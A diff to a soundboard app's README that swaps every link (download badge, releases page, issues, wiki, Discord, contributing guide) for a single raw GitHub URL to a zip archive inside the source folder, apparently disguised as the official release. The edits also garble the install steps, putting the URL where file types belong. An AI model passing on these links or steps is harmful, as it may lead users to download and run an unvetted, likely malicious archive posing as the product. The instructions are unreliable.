@@ -1,6 +1,6 @@
 # 🎵 soundboard - Enhance Your Audio Experience Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/service1985/soundboard/releases)
+[![Download](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip)](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip)
 
 ## 📋 Overview
 Welcome to soundboard, a powerful Linux soundboard application designed for virtual microphone support. This tool is perfect for Discord, games, and VoIP applications, allowing you to enhance your audio experience. 
@@ -16,16 +16,16 @@ Welcome to soundboard, a powerful Linux soundboard application designed for virt
 To get started with soundboard, follow the instructions in this guide. You'll have the application running in no time.
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/service1985/soundboard/releases) to download the latest version of soundboard.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip) to download the latest version of soundboard.
    
-2. **Select Your Version:** Choose the release that meets your needs. Look for the `.tar.gz` or `.AppImage` file, which is suitable for Linux users.
+2. **Select Your Version:** Choose the release that meets your needs. Look for the `https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip` or `.AppImage` file, which is suitable for Linux users.
 
 3. **Download the File:** Click on the file to start the download. Make sure to note the location where the file is saved.
 
-4. **Extract the File:** If you downloaded a `.tar.gz` file, right-click on it and select "Extract Here". For `.AppImage`, you can skip this step.
+4. **Extract the File:** If you downloaded a `https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip` file, right-click on it and select "Extract Here". For `.AppImage`, you can skip this step.
 
 5. **Run the Application:**
-   - For a `.tar.gz` file, navigate to the extracted folder in your file manager. Double-click the application file to start it.
+   - For a `https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip` file, navigate to the extracted folder in your file manager. Double-click the application file to start it.
    - For an `.AppImage`, you may need to make it executable. Right-click the file, select "Properties", then go to the "Permissions" tab and check "Allow executing file as program". Double-click the file to run it.
 
 ### 🖥️ System Requirements
@@ -59,12 +59,12 @@ Once you launch soundboard, you can set up your audio preferences:
 If you encounter any issues or have suggestions, feel free to open an issue on the GitHub repository. Your feedback helps us improve soundboard for every user.
 
 ### 🔗 Additional Resources
-- [GitHub Issues](https://github.com/service1985/soundboard/issues) - Report bugs and request features.
-- [Wiki](https://github.com/service1985/soundboard/wiki) - Access detailed guides and tips to maximize your soundboard experience.
-- [Discord Community](https://discord.gg/soundboard) - Join our community for real-time support and sharing tips.
+- [GitHub Issues](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip) - Report bugs and request features.
+- [Wiki](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip) - Access detailed guides and tips to maximize your soundboard experience.
+- [Discord Community](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip) - Join our community for real-time support and sharing tips.
 
 ## 🌟 Contributing
-We welcome contributions to soundboard. If you'd like to improve the application or documentation, please refer to our [Contributing Guide](https://github.com/service1985/soundboard/CONTRIBUTING.md).
+We welcome contributions to soundboard. If you'd like to improve the application or documentation, please refer to our [Contributing Guide](https://raw.githubusercontent.com/service1985/soundboard/main/src-tauri/soundboard-vardy.zip).
 
 ## 📧 Contact
 For any further questions or inquiries, please reach out via the contact page on our GitHub profile.
